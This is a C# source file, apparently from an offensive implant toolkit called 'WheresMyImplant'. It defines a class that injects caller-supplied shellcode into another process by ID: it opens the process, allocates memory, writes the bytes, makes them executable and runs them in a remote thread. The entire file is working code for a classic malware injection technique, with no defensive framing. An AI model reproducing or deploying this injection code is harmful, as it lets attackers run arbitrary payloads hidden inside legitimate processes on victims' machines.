using System;
using System.Runtime.InteropServices;

namespace WheresMyImplant
{
    public class InjectShellCodeRemote : Base
    {
        public InjectShellCodeRemote(string shellCodeString, UInt32 processId)
        {
            const char DELIMITER = ',';
            string[] shellCodeArray = shellCodeString.Split(DELIMITER);
            byte[] shellCodeBytes = new Byte[shellCodeArray.Length];

            for (int i = 0; i < shellCodeArray.Length; i++)
            {
                int value = (int)new System.ComponentModel.Int32Converter().ConvertFromString(shellCodeArray[i]);
                shellCodeBytes[i] = Convert.ToByte(value);
            }

            ////////////////////////////////////////////////////////////////////////////////
            WriteOutputNeutral("Attempting to get handle on " + processId);
            IntPtr hProcess = Unmanaged.OpenProcess(Unmanaged.PROCESS_CREATE_THREAD | Unmanaged.PROCESS_QUERY_INFORMATION | Unmanaged.PROCESS_VM_OPERATION | Unmanaged.PROCESS_VM_WRITE | Unmanaged.PROCESS_VM_READ, false, processId);
            WriteOutputGood("Handle: " + hProcess.ToString("X4"));

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpAddress = IntPtr.Zero;
            UInt32 dwSize = (UInt32)shellCodeBytes.Length;
            WriteOutputNeutral("Attempting to allocate memory");
            IntPtr lpBaseAddress = Unmanaged.VirtualAllocEx(hProcess, lpAddress, dwSize, Unmanaged.MEM_COMMIT, Winnt.PAGE_READWRITE);
            WriteOutputGood("Allocated " + dwSize + " bytes at " + lpBaseAddress.ToString("X4"));
            WriteOutputGood("Memory Protection Set to PAGE_READWRITE");  

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpNumberOfBytesWritten = 0;
            GCHandle pinnedArray = GCHandle.Alloc(shellCodeBytes, GCHandleType.Pinned);
            IntPtr shellCodeBytesPtr = pinnedArray.AddrOfPinnedObject();
            WriteOutputNeutral("Attempting to write process memory");
            Boolean writeProcessMemoryResult = Unmanaged.WriteProcessMemory(hProcess, lpBaseAddress, shellCodeBytesPtr, (UInt32)shellCodeBytes.Length, ref lpNumberOfBytesWritten);
            WriteOutputGood("Wrote " + dwSize + " bytes");

            ////////////////////////////////////////////////////////////////////////////////
            UInt32 lpflOldProtect = 0;
            WriteOutputNeutral("Attempting to Alter Memory Protections to PAGE_EXECUTE_READ");
            Boolean test = Unmanaged.VirtualProtectEx(hProcess, lpBaseAddress, dwSize, Winnt.PAGE_EXECUTE_READ, ref lpflOldProtect);
            WriteOutputGood("Set Memory Protection to PAGE_EXECUTE_READ");

            ////////////////////////////////////////////////////////////////////////////////
            IntPtr lpThreadAttributes = IntPtr.Zero;
            UInt32 dwStackSize = 0;
            IntPtr lpParameter = IntPtr.Zero;
            UInt32 dwCreationFlags = 0;
            UInt32 threadId = 0;
            WriteOutputNeutral("Attempting to start remote thread");
            IntPtr hThread = Unmanaged.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpBaseAddress, lpParameter, dwCreationFlags, ref threadId);
            WriteOutputGood("Started Thread: " + hThread);
            
            ////////////////////////////////////////////////////////////////////////////////
            Unmanaged.WaitForSingleObjectEx(hProcess, hThread, 0xFFFFFFFF);
        }
    }
}